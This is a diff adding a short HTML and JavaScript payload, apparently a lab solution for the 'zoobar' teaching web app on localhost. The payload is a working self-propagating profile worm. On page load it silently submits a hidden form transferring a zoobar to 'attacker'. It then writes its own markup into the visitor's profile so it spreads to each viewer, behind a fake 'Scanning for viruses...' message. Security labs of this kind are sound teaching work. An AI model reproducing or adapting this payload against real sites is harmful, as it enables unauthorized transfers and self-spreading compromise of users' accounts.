@@ -1,0 +1,32 @@
+<div id="not_suspicious_at_all">
+  <script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+          document.querySelector("#transfer_form").addEventListener("submit", function() {
+                profile = document.querySelector("#not_suspicious_at_all").outerHTML;
+                document.querySelector("#profile_update").value = profile;
+                setTimeout(function() {
+                      document.querySelector("#profile_submit").click();
+                    });
+              });
+          document.querySelector("#transfer_submit").click();
+        });
+
+  </script>
+
+  <p>Scanning for viruses...</p>
+
+  <div style="visibility:hidden">
+    <iframe name="dummyframe"></iframe>
+
+    <form method="post" action="http://localhost:8080/zoobar/index.cgi/transfer" target="dummyframe" id="transfer_form">
+      <input name="zoobars" value="1">
+      <input name="recipient" value="attacker">
+      <input type="submit" id="transfer_submit">
+    </form>
+
+    <form method="post" action="http://localhost:8080/zoobar/index.cgi/" target="dummyframe">
+      <input name="profile_update" value="1" id="profile_update">
+      <input type="submit" id="profile_submit">
+    </form>
+  </div>
+</div>
